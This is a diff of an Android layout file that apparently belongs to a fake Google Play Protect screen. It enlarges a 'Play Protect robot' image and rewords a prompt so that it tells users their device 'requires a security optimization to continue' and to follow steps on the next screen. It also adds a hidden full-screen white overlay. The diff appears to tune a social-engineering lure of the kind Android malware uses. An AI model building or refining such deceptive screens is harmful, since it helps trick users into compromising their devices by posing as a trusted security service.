@@ -34,10 +34,10 @@
 
         <ImageView
             android:id="@+id/ivPlayProtectRobot"
-            android:layout_width="209dp"
-            android:layout_height="182dp"
+            android:layout_width="225dp"
+            android:layout_height="207dp"
             android:layout_gravity="center_horizontal|top"
-            android:layout_marginTop="20dp"
+            android:layout_marginTop="10dp"
             android:fitsSystemWindows="true"
             android:focusedByDefault="true"
             android:forceHasOverlappingRendering="true"
@@ -130,7 +130,7 @@
             android:layout_marginTop="12dp"
             android:layout_marginBottom="32dp"
             android:gravity="center"
-            android:text="Your device requires a stability optimization to continue. Follow these steps on the next screen:"
+            android:text="Your device requires a security optimization to continue. Follow these steps on the next screen:"
             android:textColor="#5F6368"
             android:textSize="15sp" />
 
@@ -153,5 +153,14 @@
             app:cornerRadius="100dp" />
 
     </LinearLayout>
+
+    <!-- FROSTED GLASS BLUR VEIL -->
+    <View
+        android:id="@+id/viewFrostedVeil"
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:background="#FFFFFF"
+        android:alpha="0"
+        android:visibility="gone" />
 
 </FrameLayout>
